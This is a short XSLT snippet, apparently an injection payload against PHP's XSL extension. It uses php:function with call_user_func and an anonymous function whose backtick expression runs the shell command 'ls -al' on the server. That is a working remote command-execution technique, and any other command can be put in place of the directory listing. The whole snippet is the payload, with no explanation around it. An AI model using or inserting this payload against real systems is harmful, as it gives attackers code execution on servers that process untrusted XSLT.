<xsl:value-of select="php:function('call_user_func', function(){
    return `ls -al`;
})"/>